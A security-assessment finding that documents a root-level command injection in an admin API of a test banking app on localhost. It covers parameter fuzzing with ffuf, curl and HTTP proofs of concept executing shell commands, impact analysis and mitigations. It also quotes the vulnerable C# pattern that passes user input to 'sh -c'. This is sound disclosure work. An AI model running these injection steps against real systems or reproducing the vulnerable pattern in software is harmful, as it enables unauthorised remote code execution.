# Issue #13 — Command Injection in Admin System Info API

| Field         | Details                                                    |
|---------------|------------------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337/api/Admin/GetSystemInfo` |
| **Severity**  | Critical                                                   |
| **CVSS v3.1** | 9.9                                                        |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H                       |
| **Category**  | Injection — OS Command Injection                   |

---

## Summary

The `/api/Admin/GetSystemInfo` endpoint accepts an undocumented `cmd` query parameter whose value is passed directly to the underlying operating system shell for execution. The parameter was not present in the Swagger documentation (Issue #01) and was discovered through parameter fuzzing. Command output is returned verbatim in the JSON response body, providing a fully interactive, unauthenticated-equivalent remote code execution primitive.

Exploitation was confirmed in two stages: first by running `whoami` to establish the execution context, which returned `root`, and then by seeding and echoing shell variables to confirm that full shell expression evaluation — not just command execution — is taking place. The process is running as the root user, meaning there are no file system or privilege boundaries limiting what an attacker can do on the host.

---

## Steps to Reproduce

1. Log in as an admin user and send the baseline request to observe the default response:

   ```bash
   curl -s "http://localhost:1337/api/Admin/GetSystemInfo" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

2. Fuzz the endpoint for undocumented query parameters using `ffuf` and a parameter names wordlist, filtering out responses matching the default response size of 107 bytes:

   ```bash
   ffuf \
     -u "http://localhost:1337/api/Admin/GetSystemInfo?FUZZ=whoami" \
     -X GET \
     -H "Cookie: SessionId=[REDACTED]" \
     -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 107
   ```

3. Observe that the parameter `cmd` produces a response with a different size — `6` bytes — matching the length of the string `"root"`.

4. Confirm command injection by sending arbitrary shell commands:

   ```bash
   curl -s "http://localhost:1337/api/Admin/GetSystemInfo?cmd=whoami" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

5. Confirm full shell expression evaluation with a seeded `$RANDOM` variable test:

   ```bash
   curl -s "http://localhost:1337/api/Admin/GetSystemInfo?cmd=RANDOM%3d43%3b%20echo%20%24RANDOM-%24RANDOM-%24RANDOM" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

---

## Proof of Concept

### Baseline — Default Endpoint Response

**Request:**

```http
GET /api/Admin/GetSystemInfo HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Thu, 10 Jul 2025 13:32:17 GMT
Server: Kestrel
Content-Length: 107

"Linux 479171e7453e 6.15.2-arch1-1 #1 SMP PREEMPT_DYNAMIC Tue, 10 Jun 2025 21:32:33 +0000 x86_64 GNU/Linux"
```

The default response (107 bytes) serves as the calibration baseline for fuzzing.

---

### Parameter Discovery — `ffuf`

```bash
ffuf \
  -u "http://localhost:1337/api/Admin/GetSystemInfo?FUZZ=whoami" \
  -X GET \
  -H "Cookie: SessionId=[REDACTED]" \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 107
```

**Results:**

```
Cmd   [Status: 200, Size: 6, Words: 1, Lines: 1, Duration: 107ms]
cmd   [Status: 200, Size: 6, Words: 1, Lines: 1, Duration: 6287ms]
```

Both `cmd` and `Cmd` return a response of 6 bytes — consistent with `"root"` — confirming the parameter name and that the value `whoami` is being executed server-side.

---

### PoC 1 — Remote Command Execution: `whoami`

**Request:**

```http
GET /api/Admin/GetSystemInfo?cmd=whoami HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Thu, 10 Jul 2025 13:39:50 GMT
Server: Kestrel
Content-Length: 6

"root"
```

The application is executing as `root`. There are no OS-level privilege boundaries between the web process and the underlying host.

---

### PoC 2 — Full Shell Expression Evaluation

To confirm the injection point is a full shell interpreter rather than a restricted command runner, a shell arithmetic expression was injected using `$RANDOM` variable seeding:

**Payload (decoded):**

```bash
RANDOM=43; echo $RANDOM-$RANDOM-$RANDOM
```

**Request:**

```http
GET /api/Admin/GetSystemInfo?cmd=RANDOM%3d43%3b%20echo%20%24RANDOM-%24RANDOM-%24RANDOM HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Thu, 10 Jul 2025 15:02:14 GMT
Server: Kestrel
Content-Length: 18

"1798-13691-13897"
```

The server evaluated the full shell expression — seeding `$RANDOM`, then generating three distinct pseudo-random values from the seeded state — and returned the result. This confirms complete `sh` interpreter access, not just single-command execution. Semicolons, variable assignment, and variable expansion are all processed server-side.

---

## Impact

- **Full remote code execution as root** — the application executes injected commands as the `root` user, granting an attacker unrestricted control over the host operating system. Any command executable by root can be run: reading files, writing files, killing processes, installing backdoors, or pivoting to other internal hosts.
- **Complete host compromise** — with root-level RCE, an attacker can read all application secrets (database credentials, JWT signing keys, API tokens from `appsettings.json`), exfiltrate the entire database, or destroy the system entirely.
- **Persistence and lateral movement** — an attacker can install a reverse shell, add an SSH key to `/root/.ssh/authorized_keys`, or deploy a cron job to maintain persistent access. Combined with the internal network access demonstrated in Issue #12 (SSRF), this can be used to pivot to other services within the network.
- **Compounding severity from prior findings** — the path to this endpoint was shortened by the Swagger documentation (Issue #01) establishing the API surface, and the undocumented `cmd` parameter was discovered through parameter fuzzing. The admin session required to reach this endpoint could be obtained via the stored XSS on the admin panel (Issue #09, Vector B) or via credentials stolen through the SQL injection (Issue #08). All roads lead here.

---

## Recommended Mitigations

1. **Remove the `cmd` parameter entirely.** There is no legitimate reason for a production API to accept and execute arbitrary shell commands supplied by a client. This is not a misconfiguration — it is a deliberately dangerous feature that must be deleted:

   ```csharp
   // Remove any code resembling the following pattern
   var result = Process.Start("sh", $"-c {cmd}");
   ```

2. **If system information is a required feature**, collect it at application startup or on a fixed schedule using safe, hardcoded API calls — never by shelling out with user-supplied input:

   ```csharp
   // Safe alternative — no user input involved
   var osInfo = RuntimeInformation.OSDescription;
   ```

3. **Restrict the admin panel and all `/api/Admin/*` endpoints** to internal network access only, using network-level controls (firewall rules, reverse proxy IP allowlists) in addition to application-level authentication.

4. **Run the application as a non-root user.** The process should operate under a dedicated low-privilege service account with only the permissions it requires. Root execution turns any RCE into an unconditional full host compromise:

   ```dockerfile
   # In Dockerfile — never run as root
   RUN adduser --disabled-password appuser
   USER appuser
   ```

5. **Audit all other admin endpoints** for similar patterns. Any endpoint that constructs shell commands, spawns subprocesses, or invokes system utilities using input derived from request parameters should be treated as a critical finding and remediated immediately.